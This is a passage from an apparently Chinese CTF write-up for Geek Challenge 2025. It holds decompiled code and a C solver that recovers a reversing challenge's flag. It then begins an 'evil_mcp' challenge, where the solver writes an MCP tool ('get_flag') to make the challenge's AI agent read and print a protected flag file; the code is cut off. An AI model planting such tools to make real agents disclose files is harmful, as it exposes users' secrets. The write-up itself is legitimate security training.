</span></span><span class="line"><span class="cl">  <span class="nf">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000u</span><span class="p">,</span> <span class="mh">0x3000u</span><span class="p">,</span> <span class="mh">0x40u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">lpAddress</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="nf">sub_AE1186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">lpAddress</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">lpAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">unk_AEC260</span><span class="p">,</span> <span class="mh">0x38u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">lpAddress</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="nf">sub_AE105A</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">byte_AEC4E0</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="kr">__cdecl</span> <span class="o">*</span><span class="p">)(</span><span class="n">_DWORD</span><span class="p">,</span> <span class="n">_DWORD</span><span class="p">,</span> <span class="n">_DWORD</span><span class="p">))</span><span class="n">lpAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">byte_AEC4E0</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="mi">51</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sub_AE10B4</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v13</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nf">sub_AE11DB</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v13</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_AEC040</span> <span class="o">+</span> <span class="mi">64</span> <span class="o">*</span> <span class="n">j</span><span class="p">,</span> <span class="n">dword_AEC240</span><span class="p">[</span><span class="n">j</span><span class="p">])</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sub_AE1091</span><span class="p">(</span><span class="s">&#34;[!] Wrong</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">VirtualFree</span><span class="p">(</span><span class="n">lpAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x8000u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="nf">sub_AE1186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v8</span> <span class="o">=</span> <span class="n">v14</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v7</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v6</span> <span class="o">=</span> <span class="n">v16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dword_AEC4E8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_AEC4E8</span> <span class="o">=</span> <span class="n">v13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_AEC4EC</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_AEC4F0</span> <span class="o">=</span> <span class="n">v14</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_AEC4F4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_AEC4F8</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_AEC4FC</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_AEC500</span> <span class="o">=</span> <span class="n">v16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_AEC504</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">dword_AEC508</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">MK_FP</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">byte_AEC4E0</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span> <span class="n">byte_AEC4E0</span><span class="p">)(</span><span class="n">v16</span><span class="p">,</span> <span class="n">v2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">funcs_AE2612</span><span class="p">[</span><span class="n">dword_AEC508</span> <span class="o">&amp;</span> <span class="mh">0xF</span><span class="p">](</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">j</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="p">(</span><span class="n">v8</span> <span class="o">+</span> <span class="n">v6</span> <span class="o">*</span> <span class="n">v7</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="mi">40503</span> <span class="o">*</span> <span class="n">v9</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">      <span class="nf">sub_AE1186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">VirtualFree</span><span class="p">(</span><span class="n">lpAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x8000u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="nf">sub_AE1186</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">LODWORD</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="nf">sub_AE1091</span><span class="p">(</span><span class="s">&#34;[!] Wrong</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_12</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">v1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_AE113B</span><span class="p">(</span><span class="o">&amp;</span><span class="n">savedregs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dword_AE2674</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>其中加密的重点在于funcs_AE2612
<img src="/p/geek-challenge-2025-wp/image-19.png"
	width="960"
	height="367"
	srcset="/p/geek-challenge-2025-wp/image-19_hu_2e9db861057369ac.png 480w, /p/geek-challenge-2025-wp/image-19_hu_da5f6e587dc8dd8a.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="261"
		data-flex-basis="627px"
	
>
这里这几个函数事实上用到的只有几个，直接逆了</p>
<h4 id="exp-19">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">void</span> <span class="nf">fun5</span><span class="p">(</span><span class="kt">char</span> <span class="n">a1</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v3</span> <span class="o">=</span> <span class="n">a1</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">a1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">a1</span><span class="p">[</span><span class="n">a2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">a1</span><span class="p">[</span><span class="n">a2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fun1</span><span class="p">(</span><span class="kt">char</span> <span class="n">a1</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">a2</span><span class="p">;</span><span class="n">i</span> <span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">a3</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fun13</span><span class="p">(</span><span class="kt">char</span> <span class="n">a1</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="n">a3</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">a2</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span><span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">--</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">a3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fun7</span><span class="p">(</span><span class="kt">char</span> <span class="n">a1</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">ra2</span> <span class="o">=</span> <span class="n">a2</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">ra2</span><span class="p">;</span><span class="n">i</span> <span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">v3</span> <span class="o">=</span> <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">a1</span><span class="p">[</span><span class="n">a2</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">a1</span><span class="p">[</span><span class="n">a2</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">fun4</span><span class="p">(</span><span class="kt">char</span> <span class="n">a1</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">a2</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a3</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">a2</span><span class="p">;</span><span class="n">i</span> <span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">a1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+=</span> <span class="n">a3</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">c</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="sc">&#39;5&#39;</span><span class="p">,</span><span class="sc">&#39;g&#39;</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="sc">&#39;-&#39;</span><span class="p">,</span><span class="sc">&#39;t&#39;</span><span class="p">,</span><span class="sc">&#39;@&#39;</span><span class="p">,</span><span class="sc">&#39;S&#39;</span><span class="p">,</span><span class="sc">&#39;1&#39;</span><span class="p">,</span><span class="sc">&#39;A&#39;</span><span class="p">,</span><span class="sc">&#39;o&#39;</span><span class="p">,</span><span class="sc">&#39;b&#39;</span><span class="p">,</span><span class="sc">&#39;E&#39;</span><span class="p">,</span><span class="sc">&#39;K&#39;</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="sc">&#39;W&#39;</span><span class="p">,</span><span class="sc">&#39;6&#39;</span><span class="p">,</span><span class="sc">&#39;_&#39;</span><span class="p">,</span><span class="sc">&#39;K&#39;</span><span class="p">,</span><span class="sc">&#39;s&#39;</span><span class="p">,</span><span class="sc">&#39;n&#39;</span><span class="p">,</span><span class="sc">&#39;O&#39;</span><span class="p">,</span><span class="sc">&#39;l&#39;</span><span class="p">,</span><span class="sc">&#39;_&#39;</span><span class="p">,</span><span class="sc">&#39;I&#39;</span><span class="p">,</span><span class="sc">&#39;]&#39;</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">63</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="o">-</span><span class="mi">46</span><span class="p">,</span><span class="sc">&#39;i&#39;</span><span class="p">,</span><span class="sc">&#39;~&#39;</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">temp</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">;</span><span class="n">i</span> <span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span><span class="n">j</span> <span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="n">temp</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">c</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="n">temp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;S&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">temp</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;Y&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">temp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;C&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">temp</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;{&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fun5</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">2</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fun1</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x000C5F1E</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">3</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fun13</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x14</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">4</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fun5</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">5</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fun7</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">6</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fun4</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x0020C619</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">7</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">fun1</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mh">0x03488718</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span><span class="n">j</span> <span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="p">[</span><span class="n">j</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">temp</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">;</span><span class="n">i</span> <span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span><span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-11">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{1@St_0nE_THanKs_I_lOvE_y0U!}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="misc">Misc
</h2><h3 id="evil_mcp">evil_mcp
</h3><h4 id="解题流程-18">解题流程
</h4><p>这里需要写一个mcp工具让题目的ai读取并打印flag
直接按照模板写就行</p>
<h4 id="exp-20">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Any</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@tool</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="o">=</span><span class="s2">&#34;get_flag&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">description</span><span class="o">=</span><span class="s2">&#34;读取并输出flag文件内容&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">input_schema</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;object&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;properties&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;file_path&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;string&#34;</span><span class="p">,</span>
